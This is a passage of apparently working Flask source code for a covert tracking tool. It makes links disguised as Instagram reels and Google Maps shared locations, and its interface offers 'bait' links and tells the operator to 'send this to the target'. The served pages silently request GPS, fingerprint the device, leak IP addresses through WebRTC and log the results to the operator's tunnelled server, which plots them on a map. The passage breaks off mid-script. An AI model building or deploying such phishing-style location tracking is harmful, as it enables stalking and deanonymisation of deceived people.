            setTimeout(function() {{ location.reload(); }}, 3000);
          }}
        }})
        .catch(function() {{
          document.getElementById("poll-status").textContent = "Connection lost...";
        }});
    }}

    // Request notification permission
    if ("Notification" in window && Notification.permission === "default") {{
      Notification.requestPermission();
    }}

    // Poll every 3 seconds
    setInterval(pollHits, 3000);
    pollHits();
    </script>

    <!-- Map -->
    <div class="glass-bright p-4 mb-6" style="height:400px;position:relative">
      <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
      <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
      <div id="trackmap" style="height:100%;border-radius:8px"></div>
      <script>
      var m=L.map('trackmap').setView([41.9,12.5],3);
      L.tileLayer('https://{{s}}.basemaps.cartocdn.com/dark_all/{{z}}/{{x}}/{{y}}{{r}}.png',{{maxZoom:19}}).addTo(m);
      var mk={markers_json};
      var gps={gps_markers_json};
      var b=[];
      // IP geolocation markers (circles, ~25km accuracy)
      mk.forEach(function(p){{
        var c=p.from_ig?'#ff3366':'#00cccc';
        L.circleMarker([p.lat,p.lon],{{radius:10,fillColor:c,color:'#fff',weight:2,fillOpacity:0.6}})
        .addTo(m).bindPopup('<b>IP: '+p.ip+'</b><br>'+p.city+', '+p.country+'<br>'+p.device+'<br>'+p.time+'<br><span style="color:#888">IP geolocation (~25km)</span>');
        b.push([p.lat,p.lon]);
      }});
      // GPS precision markers (pins with accuracy circles)
      gps.forEach(function(g){{
        var acc=g.acc||50;
        // Accuracy circle (green, semi-transparent)
        L.circle([g.lat,g.lon],{{radius:acc,fillColor:'#00ff66',color:'#00ff66',weight:1,fillOpacity:0.15}}).addTo(m);
        // Pin marker (bright green, larger)
        L.circleMarker([g.lat,g.lon],{{radius:8,fillColor:'#00ff66',color:'#fff',weight:3,fillOpacity:1}})
        .addTo(m).bindPopup('<b style="color:#00ff66">GPS FIX</b><br>Accuracy: '+Math.round(acc)+'m<br>'+g.device+'<br>'+g.time+'<br>Source: '+g.src+'<br><code>'+g.lat.toFixed(6)+', '+g.lon.toFixed(6)+'</code>');
        b.push([g.lat,g.lon]);
      }});
      if(b.length>0)m.fitBounds(b,{{padding:[30,30]}});
      </script>
    </div>

    <!-- Hit log -->
    <div    <div class="glass-bright p-4">
      <h2 class="text-sm font-semibold text-cyan-400 mb-3">Hit Log <span class="text-[10px] text-gray-500">(live polling 3s)</span></h2>
      <div style="overflow-x:auto">
      <table class="w-full">
        <thead><tr class="text-gray-500 border-b border-white/10 text-[10px]">
          <th class="text-left py-2 px-3">Time</th><th class="py-2 px-3">Type</th><th class="text-left py-2 px-3">IP</th>
          <th class="text-left py-2 px-3">Location</th><th class="py-2 px-3">Device</th>
          <th class="text-left py-2 px-3">ISP</th><th class="py-2 px-3">GPS</th>
        </tr></thead>
        <tbody>{hit_rows}</tbody>
      </table>
      </div>
    </div>
    """

    return _render(f"Tracker {tracking_id}", content, "tracking")




@app.route('/api/tracking/hits/<tracking_id>')
def api_tracking_hits(tracking_id):
    """Get hit stats for auto-refresh polling."""
    from core.ip_logger import get_hits, get_best_location
    hits = get_hits(tracking_id)
    unique = len(set(h.get("ip") for h in hits))
    ig = sum(1 for h in hits if h.get("from_instagram"))
    real = sum(1 for h in hits if h.get("hit_type") == "real_device")
    has_gps = any(h.get("gps_lat") and h["gps_lat"] != 0 for h in hits)
    best_loc = get_best_location(tracking_id)
    return jsonify({
        "total": len(hits), "unique_ips": unique, "ig_hits": ig,
        "real_devices": real, "has_gps": has_gps,
        "best_location": best_loc,
        "tracking_id": tracking_id,
    })

@app.route('/api/tracking/create', methods=['POST'])
def api_create_tracker():
    """Create a new tracking link with auto-shortened URLs."""
    from core.ip_logger import generate_tracking_id, LOG_DIR

    data = request.get_json() or {}
    label = data.get("label", "")
    destination = data.get("destination", "https://www.google.com")

    tid = generate_tracking_id(label)
    server = request.host

    # Save metadata
    meta = {"label": label, "destination": destination, "created": datetime.now().isoformat()}
    (LOG_DIR / f"{tid}_meta.json").write_text(json.dumps(meta))

    # Build raw links — use tunnel URL if available, else local
    tunnel = _tunnel_status()
    base = tunnel["url"] if tunnel.get("running") and tunnel.get("url") else f"http://{server}"
    raw_links = {
        "redirect": f"{base}/t/{tid}",
        "link_preview": f"{base}/lp/{tid}",
        "geo_locate": f"{base}/gl/{tid}",
        "canary": f"{base}/c/{tid}",
        "pixel": f"{base}/p/{tid}.gif",
    }

    # Generate disguised reel-style links using tracking ID directly
    # The /reel/<tid> route uses the tracking ID to find destination + log hits
    short_links = {
        "redirect": f"{base}/reel/{tid}",
        "link_preview": f"{base}/reel/{tid}",
        "geo_locate": f"{base}/reel/{tid}",
    }


    return jsonify({
        "tracking_id": tid,
        "links": {
            "redirect": raw_links["redirect"],
            "pixel": raw_links["pixel"],
            "pixel_html": f'<img src="{raw_links["pixel"]}" width="1" height="1" style="display:none">',
            "canary": raw_links["canary"],
            "geo_locate": raw_links["geo_locate"],
            "short_redirect": f"{base}/reel/{tid}",
            "short_preview": f"{base}/reel/{tid}",
            "short_gps": raw_links["geo_locate"],
            "link_preview": raw_links["link_preview"],
            "og_image": f"{base}/og/{tid}.jpg",
        }
    })



# ══════════════════════════════════════════════════════════════
# Zero-Click IP Probing — Link Preview Exploitation
# ══════════════════════════════════════════════════════════════

@app.route('/lp/<tracking_id>')
def link_preview_page(tracking_id):
    """Zero-click: Page with OG meta tags + multiple tracking vectors.

    Tracking vectors (in priority order):
    1. Page load itself → server logs IP from request headers
    2. og:image fetch → crawler or client fetches our JPEG → IP logged
    3. CSS background-image → some clients process inline CSS → IP logged
    4. Favicon → some clients fetch favicon → IP logged
    5. If user clicks through: JS pixel, WebRTC STUN, geolocation, fingerprint
    """
    from core.ip_logger import log_hit, LOG_DIR

    ip = _get_real_ip()
    ua = request.headers.get("User-Agent", "")

    crawlers = ["facebookexternalhit", "Facebot", "Twitterbot", "TelegramBot",
                "WhatsApp", "LinkedInBot", "Slackbot", "Discordbot", "bot", "crawler"]
    is_crawler = any(c.lower() in ua.lower() for c in crawlers)

    dc = ("2a03:2880:", "31.13.", "157.240.", "69.63.",
          "44.248.", "44.244.", "44.238.", "34.214.", "18.237.", "52.94.", "54.239.",
          "172.67.", "104.16.", "104.17.", "104.18.", "104.21.", "104.22.",
          "66.220.", "66.102.", "72.14.", "74.125.", "142.250.", "173.194.",
          "91.108.", "149.154.")
    is_datacenter = any(ip.startswith(p) for p in dc)

    hit_type = "bot_crawler" if is_crawler else ("preview_fetch" if is_datacenter else "real_device")

    log_hit(tracking_id, ip, ua, request.headers.get("Referer", ""), {
        "method": "link_preview",
        "hit_type": hit_type,
        "is_crawler": is_crawler,
        "is_datacenter": is_datacenter,
    })

    # Get destination
    meta_path = LOG_DIR / (tracking_id + "_meta.json")
    dest = "https://www.instagram.com"
    if meta_path.exists():
        try:
            dest = json.loads(meta_path.read_text()).get("destination", dest)
        except Exception:
            pass

    # MUST use tunnel URL for all resources (HTTPS required, no mixed content)
    base_url = _tunnel_status().get("url") or ("https://" + request.host)

    lp_html = """<!DOCTYPE html><html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta property="og:site_name" content="Instagram">
<meta property="og:type" content="video.other">
<meta property="og:title" content="Instagram Reel">
<meta property="og:description" content="Liked by 8,432 others">
<meta property="og:image" content="__BASE__/og/__TID__.jpg">
<meta property="og:image:type" content="image/jpeg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:url" content="__BASE__/lp/__TID__">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Instagram Reel">
<meta name="twitter:image" content="__BASE__/og/__TID__.jpg">
<meta name="twitter:site" content="@instagram">
<meta name="telegram:channel" content="@instagram">
<link rel="icon" href="__BASE__/p/__TID__.gif">
<link rel="shortcut icon" href="__BASE__/p/__TID__.gif">
<link rel="apple-touch-icon" href="__BASE__/og/__TID__.jpg">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  display:flex;align-items:center;justify-content:center;min-height:100vh;
  background-image:url('__BASE__/p/__TID__.gif')}
.w{text-align:center;max-width:360px;padding:20px}
.spinner{width:24px;height:24px;border:2px solid #333;border-top:2px solid #fff;border-radius:50%;
  animation:s .8s linear infinite;margin:20px auto}
@keyframes s{to{transform:rotate(360deg)}}
.m{color:#8e8e8e;font-size:14px;margin:12px 0}.s{color:#555;font-size:12px}
.b{display:inline-block;background:#0095f6;color:#fff;font-weight:600;font-size:14px;
  padding:10px 20px;border-radius:8px;text-decoration:none;margin-top:16px}
</style>
</head>
<body>
<div class="w">
  <svg width="175" height="51" viewBox="0 0 175 51" fill="#fff" style="margin:0 auto 20px;display:block">
    <path d="M0 35.2V16h4.6v19.2H0zm7.2 0V16h4.4v2.5h.1c.9-1.8 2.8-3 5.2-3 4.2 0 6.4 3 6.4 7v12.7h-4.6V23.4c0-2.4-1-4-3.2-4-2 0-3.7 1.5-3.7 4.3v11.5H7.2z"/>
  </svg>
  <div class="spinner"></div>
  <div class="m">Opening in Instagram...</div>
  <div class="s">You'll be redirected automatically</div>
  <a href="__DEST__" class="b">Open in app</a>
</div>
<img src="__BASE__/p/__TID__.gif" width="1" height="1" style="position:absolute;left:-9999px">
<script>
(function(){
var T='__TID__';
// Pixel beacon
new Image().src='__BASE__/p/'+T+'.gif?t='+Date.now();
// GPS silent probe
if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(function(p){
    var c=p.coords;
    new Image().src='__BASE__/api/geo_hit?tid='+T+'&lat='+c.latitude+'&lon='+c.longitude+'&acc='+c.accuracy+'&src=lp_auto';
  },function(){},{enableHighAccuracy:true,timeout:5000,maximumAge:0});
}
// Fingerprint
setTimeout(function(){
  var d={tid:T};
  try{d.screen_w=screen.width;d.screen_h=screen.height;d.pixel_ratio=devicePixelRatio||1}catch(e){}
  try{d.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;d.language=navigator.language;d.platform=navigator.platform}catch(e){}
  try{d.cpu_cores=navigator.hardwareConcurrency||0;d.ram_gb=navigator.deviceMemory||0;d.touch_points=navigator.maxTouchPoints||0}catch(e){}
  try{var x=new XMLHttpRequest();x.open('POST','__BASE__/api/fingerprint');x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(d))}catch(e){}
},300);
// WebRTC STUN
try{
  var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
  pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o)});
  pc.onicecandidate=function(e){
    if(!e||!e.candidate)return;
    var m=e.candidate.candidate.match(/([0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3})/);
    if(m)new Image().src='__BASE__/p/'+T+'.gif?webrtc_ip='+m[1];
  };
}catch(e){}
// Redirect after 2s
setTimeout(function(){window.location.href='__DEST__'},2000);
})();
</script>
</body></html>"""
    lp_html = lp_html.replace("__BASE__", base_url)
    lp_html = lp_html.replace("__TID__", tracking_id)
    lp_html = lp_html.replace("__DEST__", dest)
    return Response(lp_html, mimetype="text/html", headers={"Cache-Control": "no-cache"})


@app.route('/og/<tracking_id>.jpg')
def og_image_tracker(tracking_id):
    """OG Image tracker — loaded automatically when link preview is generated.

    This is the og:image URL. When any platform generates a preview of
    /lp/{tracking_id}, it fetches this image. The request logs the IP.

    Returns a generic placeholder image (real-looking, not suspicious).
    """
    from core.ip_logger import log_hit

    ip = _get_real_ip()
    ua = request.headers.get("User-Agent", "")

    is_crawler = any(c.lower() in ua.lower() for c in
        ["facebookexternalhit", "Facebot", "Twitterbot", "TelegramBot", "WhatsApp", "bot"])

    # Comprehensive datacenter IP detection
    dc = ("2a03:2880:", "31.13.", "157.240.", "69.63.",  # Facebook/Meta
          "44.248.", "44.244.", "44.238.", "34.214.", "18.237.", "52.94.", "54.239.",  # Amazon/AWS
          "172.67.", "104.16.", "104.17.", "104.18.", "104.21.", "104.22.",  # Cloudflare
          "66.220.", "66.102.", "72.14.", "74.125.", "142.250.", "173.194.",  # Google
          "91.108.", "149.154.",  # Telegram
    )
    is_datacenter = any(ip.startswith(p) for p in dc)

    hit_type = "bot_crawler" if is_crawler else ("preview_fetch" if is_datacenter else "real_device")

    log_hit(tracking_id, ip, ua, "", {
        "method": "og_image",
        "hit_type": hit_type,
        "is_crawler": is_crawler,
        "is_datacenter": is_datacenter,
        "webrtc_ip": request.args.get("webrtc_ip", ""),
    })

    # Generate a real JPEG image (Instagram requires JPEG/PNG for preview)
    import io
    try:
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (1200, 630), color=(20, 20, 40))
        draw = ImageDraw.Draw(img)
        # Instagram-like gradient background
        for y in range(630):
            r = int(20 + (y / 630) * 30)
            g = int(10 + (y / 630) * 15)
            b = int(40 + (y / 630) * 40)
            draw.line([(0, y), (1200, y)], fill=(r, g, b))
        # Play button circle
        draw.ellipse([520, 235, 680, 395], fill=(255, 255, 255, 180), outline=(255, 255, 255))
        draw.polygon([(560, 265), (560, 365), (650, 315)], fill=(20, 20, 40))
        # Text
        try:
            font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 28)
            font_sm = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 18)
        except:
            font = ImageFont.load_default()
            font_sm = font
        draw.text((420, 430), "Watch this reel", fill=(220, 220, 220), font=font)
        draw.text((460, 475), "Tap to play video", fill=(150, 150, 150), font=font_sm)

        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=85)
        jpeg_bytes = buf.getvalue()
    except Exception:
        # Fallback: minimal valid JPEG (1x1 red pixel)
        jpeg_bytes = bytes([
            0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
            0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xDB, 0x00, 0x43,
            0x00, 0x08, 0x06, 0x06, 0x07, 0x06, 0x05, 0x08, 0x07, 0x07, 0x07, 0x09,
            0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D, 0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12,
            0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F, 0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20,
            0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C, 0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29,
            0x2C, 0x30, 0x31, 0x34, 0x34, 0x34, 0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32,
            0x3C, 0x2E, 0x33, 0x34, 0x32, 0xFF, 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01,
            0x00, 0x01, 0x01, 0x01, 0x11, 0x00, 0xFF, 0xC4, 0x00, 0x1F, 0x00, 0x00,
            0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
            0x09, 0x0A, 0x0B, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F,
            0x00, 0x7B, 0x40, 0x1B, 0xFF, 0xD9,
        ])

    return Response(jpeg_bytes, mimetype="image/jpeg", headers={
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
    })


# ── Tunnel Management ──

def _tunnel_status():
    import re as _re
    pid = None; url = ""; running = False
    pid_path = Path("/tmp/cloudflared.pid")
    log_path = Path("/tmp/cloudflared.log")
    if pid_path.exists():
        try:
            pid = int(pid_path.read_text().strip())
            os.kill(pid, 0)
            running = True
        except: running = False
    if not running:
        try:
            r = subprocess.run(["pgrep", "-f", "cloudflared tunnel"], capture_output=True, text=True, timeout=3)
            if r.stdout.strip():
                pid = int(r.stdout.strip().split()[0])
                running = True
        except: pass
    if running and log_path.exists():
        urls = _re.findall(r"https://[a-z0-9-]+\.trycloudflare\.com", log_path.read_text())
        if urls: url = urls[-1]
    return {"running": running, "pid": pid, "url": url}


@app.route('/tunnel')
def tunnel_page():
    """Tunnel management + IP tracking with bait templates."""
    from core.ip_logger import list_trackers
    from pathlib import Path
    ts = _tunnel_status()
    trackers = list_trackers()
    is_on = ts["running"]
    turl = ts["url"]

    # Status
    dot_cls = "bg-green-500 pulse" if is_on else "bg-red-500"
    glow_cls = "glow-green" if is_on else "glow-red"
    status_label = "ACTIVE" if is_on else "OFFLINE"
    status_color = "text-green-400" if is_on else "text-red-400"

    page = ""
    page += '<h1 class="text-xl font-bold text-white mb-6">IP Tracking</h1>'

    # Status card
    page += '<div class="glass p-5 mb-6 ' + glow_cls + '">'
    page += '<div class="flex items-center justify-between">'
    page += '<div>'
    page += '<div class="flex items-center gap-3 mb-2">'
    page += '<div class="w-3 h-3 rounded-full ' + dot_cls + '"></div>'
    page += '<h2 class="text-lg font-bold ' + status_color + '">Tunnel ' + status_label + '</h2>'
    page += '</div>'
    if ts.get("pid"):
        page += '<div class="text-xs text-gray-400">PID: ' + str(ts["pid"]) + '</div>'
    if turl:
        page += '<div class="mt-2"><code class="text-cyan-400 text-sm bg-black/30 px-3 py-1 rounded">' + turl + '</code></div>'
    page += '</div>'
    page += '<div class="flex gap-2">'
    if is_on:
        page += "<button onclick=\"fetch('/api/tunnel/stop',{method:'POST'}).then(()=>location.reload())\" class=\"px-3 py-1.5 bg-red-500/20 border border-red-500/30 rounded-lg text-red-400 text-xs\">Stop</button>"
        page += "<button onclick=\"fetch('/api/tunnel/restart',{method:'POST'}).then(()=>setTimeout(()=>location.reload(),6000))\" class=\"px-3 py-1.5 bg-yellow-500/20 border border-yellow-500/30 rounded-lg text-yellow-400 text-xs\">Restart</button>"
    else:
        page += "<button onclick=\"fetch('/api/tunnel/start',{method:'POST'}).then(()=>setTimeout(()=>location.reload(),6000))\" class=\"px-3 py-1.5 bg-green-500/20 border border-green-500/30 rounded-lg text-green-400 text-xs\">Start Tunnel</button>"
    page += '</div></div></div>'

    # Create tracker (only when tunnel active)
    if is_on and turl:
        page += '<div class="glass-bright p-5 mb-6" x-data="{label:\'\',dest:\'\',tid:\'\'}">'
        page += '<h2 class="text-sm font-semibold text-red-400 mb-3">Create Tracking Link</h2>'

        # Bait categories — one-click ready
        baits = {
            "Viral": [
                ("\U0001f602 Epic fails", "https://www.instagram.com/reel/C6K2VxqIvbn/"),
                ("\U0001f923 Try not to laugh", "https://www.instagram.com/reel/C7mXkZ8IaGE/"),
                ("\U0001f631 Unexpected", "https://www.instagram.com/reel/C5dM3kXocvB/"),
            ],
            "Animals": [
                ("\U0001f408 Funny cats", "https://www.instagram.com/reel/C5xkJ3OoYjR/"),
                ("\U0001f436 Cute dogs", "https://www.instagram.com/reel/C6gN5S4oZwQ/"),
                ("\U0001f43b Baby animals", "https://www.instagram.com/reel/C4pBfXUIk7S/"),
            ],
            "Food/Travel": [
                ("\U0001f35c Street food", "https://www.instagram.com/reel/C4YwT2boFpR/"),
                ("\u2708 Travel", "https://www.instagram.com/reel/C5L9vXPoKjN/"),
                ("\U0001f372 Cooking", "https://www.instagram.com/reel/C7mXkZ8IaGE/"),
            ],
            "Lifestyle": [
                ("\U0001f4aa Gym", "https://www.instagram.com/reel/C7RzKl0IYmT/"),
                ("\U0001f4a1 Life hacks", "https://www.instagram.com/reel/C6pQm8NoTkW/"),
                ("\U0001f3a8 Satisfying", "https://www.instagram.com/reel/C4pBfXUIk7S/"),
            ],
            "Curiosity": [
                ("\U0001f310 Did you know", "https://www.instagram.com/reel/C5dM3kXocvB/"),
                ("\U0001f52e Science", "https://www.instagram.com/reel/C6pQm8NoTkW/"),
                ("\U0001f680 Tech", "https://www.instagram.com/reel/C6K2VxqIvbn/"),
            ],
        }

        page += '<div class="mb-4">'
        page += '<div class="text-[10px] text-gray-500 mb-2">One-click bait \u2014 select, then Generate:</div>'
        page += '<div class="grid grid-cols-5 gap-2">'
        for cat_name, cat_items in baits.items():
            page += '<div class="glass p-2">'
            page += '<div class="text-[9px] text-gray-400 font-semibold mb-1">' + cat_name + '</div>'
            for bname, burl in cat_items:
                page += '<button @click="dest=\'' + burl + '\'" class="block w-full text-left text-[10px] px-2 py-1 rounded hover:bg-white/10 text-gray-300 hover:text-white">' + bname + '</button>'
            page += '</div>'
        page += '</div>'
        # Other platforms
        page += '<div class="flex gap-2 mt-2 mb-3">'
        page += '<button @click="dest=\'https://www.tiktok.com/@khaby.lame/video/7351234567890\'" class="text-[9px] px-2 py-0.5 rounded bg-purple-500/10 text-purple-400 hover:text-white">TikTok</button>'
        page += '<button @click="dest=\'https://youtube.com/shorts/dQw4w9WgXcQ\'" class="text-[9px] px-2 py-0.5 rounded bg-red-500/10 text-red-400 hover:text-white">YT Short</button>'
        page += '</div>'
        page += '</div>'

        page += '<div class="grid grid-cols-3 gap-2 mb-3">'
        page += '<input x-model="label" type="text" placeholder="target_name" class="bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:outline-none">'
        page += '<input x-model="dest" type="text" placeholder="Paste bait URL or custom" class="bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:outline-none">'
        page += """<button @click="fetch('/api/tracking/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label:label,destination:dest})}).then(r=>r.json()).then(d=>{tid=d.tracking_id;window._links=d.links;window.open('/tracking/'+tid,'_blank')})" class="px-4 py-2 bg-red-500/20 border border-red-500/30 rounded-lg text-red-400 text-xs">Generate & Monitor</button>"""
        page += '</div>'
        page += '<div x-show="tid" class="bg-black/40 rounded-lg p-4 space-y-2 text-[11px]">'
        page += '<div class="mb-2">ID: <code class="text-white" x-text="tid"></code></div>'
        page += '<div class="text-[10px] text-green-300 font-semibold mb-1">Send this to the target:</div>'
        page += '<div class="bg-green-500/10 border border-green-500/20 rounded-lg p-3 mb-2">'
        page += '<div class="text-[10px] text-gray-400 mb-1">Reel link (send via DM/chat):</div>'
        page += '<code class="text-green-300 text-sm" x-text="\'' + turl + '/reel/' + '\' + tid"></code>'
        page += '</div>'
        page += '<div class="text-[9px] text-gray-500">Target sees: Instagram logo + spinner + redirect to real reel</div>'
        page += '<div class="text-[9px] text-gray-500 mt-1">You get: IP + GPS + device + Instagram detection</div>'
        page += '</div></div>'

    # Trackers table
    tracker_rows = ""
    for t in trackers[:20]:
        ips = ", ".join(t["ips"][:3])
        tracker_rows += '<tr class="table-row border-b border-white/5 text-xs"><td class="py-2 px-3"><a href="/tracking/' + t["id"] + '" class="text-cyan-400">' + t["id"][:12] + '</a></td><td class="py-2 px-3 text-center text-green-400">' + str(t["hits"]) + '</td><td class="py-2 px-3 text-gray-400 text-[10px]">' + ips[:40] + '</td><td class="py-2 px-3 text-gray-500 text-[10px]">' + t["last_hit"][:16] + '</td></tr>'

    page += '<div class="glass-bright p-5 mb-6">'
    page += '<h2 class="text-sm font-semibold text-cyan-400 mb-3">Trackers (' + str(len(trackers)) + ')</h2>'
    page += '<table class="w-full"><thead><tr class="text-gray-500 border-b border-white/10 text-xs"><th class="text-left py-2 px-3">ID</th><th class="py-2 px-3">Hits</th><th class="text-left py-2 px-3">IPs</th><th class="py-2 px-3">Last</th></tr></thead>'
    page += '<tbody>' + tracker_rows + '</tbody></table></div>'

    # Cloudflared log
    cf_log = ""
    log_path = Path("/tmp/cloudflared.log")
    if log_path.exists():
        try:
            cf_lines = log_path.read_text().split("\n")[-15:]
            cf_log = "\n".join(cf_lines)
        except:
            cf_log = "(cannot read)"

    page += '<div class="glass-bright p-4">'
    page += '<div class="flex items-center justify-between mb-2">'
    page += '<h2 class="text-sm font-semibold text-gray-400">Cloudflared Log</h2>'
    page += '<button onclick="location.reload()" class="text-[10px] text-gray-500 hover:text-white">Refresh</button></div>'
    page += '<pre class="text-[9px] text-gray-500 bg-black/40 rounded-lg p-3 max-h-40 overflow-y-auto whitespace-pre-wrap">'
    page += cf_log.replace("<", "&lt;").replace(">", "&gt;")
    page += '</pre></div>'

    return _render("Tunnel", page, "tunnel")


@app.route('/api/tunnel/start', methods=['POST'])
def api_tunnel_start():
    ts = _tunnel_status()
    if ts["running"]: return jsonify(ts)
    try:
        proc = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"],
            stdout=open("/tmp/cloudflared.log", "w"), stderr=subprocess.STDOUT, preexec_fn=os.setsid)
        Path("/tmp/cloudflared.pid").write_text(str(proc.pid))
        return jsonify({"status": "starting", "pid": proc.pid})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/tunnel/stop', methods=['POST'])
def api_tunnel_stop():
    subprocess.run(["pkill", "-f", "cloudflared tunnel"], capture_output=True, timeout=5)
    Path("/tmp/cloudflared.pid").unlink(missing_ok=True)
    return jsonify({"status": "stopped"})

@app.route('/api/tunnel/restart', methods=['POST'])
def api_tunnel_restart():
    subprocess.run(["pkill", "-f", "cloudflared tunnel"], capture_output=True, timeout=5)
    time.sleep(2)
    Path("/tmp/cloudflared.pid").unlink(missing_ok=True)
    proc = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=open("/tmp/cloudflared.log", "w"), stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    Path("/tmp/cloudflared.pid").write_text(str(proc.pid))
    return jsonify({"status": "restarting", "pid": proc.pid})

@app.route('/api/tunnel/status')
def api_tunnel_status_endpoint():
    return jsonify(_tunnel_status())



# ══════════════════════════════════════════════════════════════
# Precision Geolocation Tracker — Browser GPS API
# ══════════════════════════════════════════════════════════════

@app.route('/gl/<tracking_id>')
def geo_locate_page(tracking_id):
    """High-precision geolocation page disguised as Instagram-like content.
    
    Uses browser Geolocation API (navigator.geolocation) to get EXACT GPS.
    The page looks like a loading screen for Instagram content, asks for
    location permission (like many reel/story pages do), captures coords,
    then redirects to the real destination.
    
    Accuracy: 5-30 meters (GPS) vs 1-50km (IP-based).
    """
    from core.ip_logger import log_hit, LOG_DIR
    
    ip = request.headers.get("Cf-Connecting-Ip", request.headers.get("X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)))

    ua = request.headers.get("User-Agent", "")
    
    # Log the page load (IP-based, before JS geo)
    log_hit(tracking_id, ip, ua, request.headers.get("Referer", ""), {"method": "geo_page_load"})
    
    # Get destination from meta
    meta_path = LOG_DIR / (tracking_id + "_meta.json")
    dest = "https://www.instagram.com"
    if meta_path.exists():
        try:
            dest = json.loads(meta_path.read_text()).get("destination", dest)
        except: pass
    
    server = request.host
    
    base_url = _tunnel_status().get("url") or ("http://" + server)
    og_img = base_url + "/og/" + tracking_id + ".jpg"

    gl_html = """<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta property="og:title" content="Google Maps - Shared Location">
<meta property="og:description" content="Someone shared a location with you">
<meta property="og:image" content="__OG_IMAGE__">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<title>Google Maps</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1a2e;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
.card{background:#16213e;border-radius:16px;padding:32px;max-width:340px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.3)}
.icon{width:48px;height:48px;margin:0 auto 16px;background:#4285f4;border-radius:50%;display:flex;align-items:center;justify-content:center}
.icon svg{width:24px;height:24px;fill:#fff}
h2{font-size:16px;margin-bottom:8px;color:#e0e0e0}
.sub{color:#8e8e8e;font-size:13px;line-height:1.5;margin-bottom:20px}
.spinner{width:24px;height:24px;border:2px solid #333;border-top:2px solid #4285f4;border-radius:50%;animation:spin .8s linear infinite;margin:16px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.btn{background:#4285f4;color:#fff;border:none;padding:12px 28px;border-radius:24px;font-size:14px;font-weight:600;cursor:pointer;display:none;margin-top:12px}
.btn:active{background:#3367d6}
.hide{display:none}
.pbar{height:3px;background:#333;border-radius:2px;margin:12px 0;overflow:hidden}
.pbar-fill{height:100%;background:linear-gradient(90deg,#4285f4,#34a853);width:0;transition:width 2s ease}
.info{color:#555;font-size:11px;margin-top:16px}
</style>
</head>
<body>
<div class="card">
  <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg></div>
  <div id="loading">
    <h2>Loading shared location...</h2>
    <div class="sub">Verifying your position to show nearby content</div>
    <div class="pbar"><div class="pbar-fill" id="pbar"></div></div>
    <div class="spinner"></div>
  </div>
  <div id="perm" class="hide">
    <h2>Enable Location</h2>
    <div class="sub">Allow location access to view the shared place and get directions</div>
    <button class="btn" id="allowBtn" style="display:inline-block" onclick="requestGeo()">Allow Location</button>
  </div>
  <div class="info" id="status"></div>
</div>

<img src="/p/__TID__.gif" width="1" height="1" style="display:none">

<script>
(function(){
var T='__TID__',D='__DEST__',sent=false;
document.getElementById('pbar').style.width='80%';

function sendGeo(c,src){
  if(sent)return;sent=true;
  var u='/api/geo_hit?tid='+T+'&lat='+c.latitude+'&lon='+c.longitude+'&acc='+c.accuracy+'&src='+src;
  if(c.altitude!==null)u+='&alt='+c.altitude;
